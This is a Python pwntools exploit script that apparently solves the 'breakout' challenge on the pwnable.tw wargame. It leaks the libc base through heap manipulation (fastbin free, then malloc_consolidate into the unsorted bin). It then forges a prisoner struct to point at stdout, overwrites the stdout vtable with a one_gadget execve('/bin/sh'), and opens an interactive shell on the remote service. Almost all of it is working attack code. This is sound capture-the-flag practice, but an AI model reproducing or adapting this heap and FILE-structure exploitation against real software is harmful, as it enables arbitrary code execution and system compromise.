#!/usr/bin/env python3
from pwn import *
import shutil
sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)
slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()
lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda l, c: c * l
z = lambda l: l * b'\0'
A = lambda l: l * b'A'

e = context.binary = ELF('./breakout_patched', checksec=False)
libc = ELF('./libc_64.so.6', checksec=False)
ld = ELF('ld-linux-x86-64.so.2', checksec=False)

TERMINAL = 0
USE_PTY = False
GDB_ATTACH_DELAY = 1
ALLOW_MEM = 0

_wsl_distro = os.environ.get("WSL_DISTRO_NAME", "Ubuntu")
terms = {
    1: ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"],
    2: ["tmux", "split-window", "-h"],
    3: ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe",
        "-w", "0", "split-pane", "-V", "-s", "0.5",
        "wsl.exe", "-d", _wsl_distro, "bash", "-c"],
}

if TERMINAL == 0:
    if shutil.which("tilix"):
        context.terminal = terms[1]
    elif os.path.exists("/proc/version") and "microsoft" in open("/proc/version").read().lower():
        context.terminal = terms[3]
    elif shutil.which("tmux"):
        context.terminal = terms[2]
    else:
        raise ValueError("Auto-detect failed: none of tilix, wsl2, tmux found")
elif TERMINAL in terms:
    context.terminal = terms[TERMINAL]
else:
    raise ValueError(f"Unknown terminal: {TERMINAL}")

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
brva 0x1875
b *vfprintf+206
continue
'''

def attach(p):
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        sleep(GDB_ATTACH_DELAY)

def _mem_limit():
    if ALLOW_MEM > 0:
        import resource
        limit = int(ALLOW_MEM * 1024 ** 3)
        resource.setrlimit(resource.RLIMIT_AS, (limit, limit))

def conn():
    if args.LOCAL:
        if USE_PTY:
            p = process([e.path], stdin=PTY, stdout=PTY, stderr=PTY, preexec_fn=_mem_limit)
        else:
            p = process([e.path], preexec_fn=_mem_limit)
        sleep(0.25)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10400
        return remote(host, port)


def list_():
    sla(p, b"> ", b"list")

def note(cell, size, data):
    sla(p, b"> ", b"note")
    slan(p, b"Cell: ", cell)
    slan(p, b"Size: ", size)
    sa(p, b"Note: ", data)

def punish(cell):
    sla(p, b"> ", b"punish")
    slan(p, b"Cell: ", cell)

attempt = 0
while True:
    attempt += 1
    print("\n----------> Attempt", attempt)
    
    p = conn()

    # Free to fastbins
    punish(9)
    # Malloc large size to trigger malloc_consolidate()
    # to put chunk to unsortedbin
    note(9, 0x410, b'A')

    print("Leaking libc")
    list_()
    ru(p, b'Prisoner: ')
    libc.address = leak_bytes(rn(p, 6), 0x3c3ba8)
    lg("libc base", libc.address)

    fake_prisoner = flat(
        0, # risk
        0, # name
        0, # nickname
        p32(0), # age
        p32(9), # cell number
        0, # sentence
        0, # note_size + pad
        0, # note
        libc.symbols['_IO_2_1_stdout_'] + 0xd8 - 0x30 # next
    )
    note(8, 0x40, fake_prisoner)

    attach(p)

    '''
    0xf0567 execve("/bin/sh", rsp+0x70, environ)
    constraints:
    [rsp+0x70] == NULL
    '''
    print("Overwrite stdout vtable")
    note(0, 0xa8, z(0x38) + p64(libc.address + 0xf0567))

    print("Spawn shell")
    list_()

    ia(p)
    p.close()
    break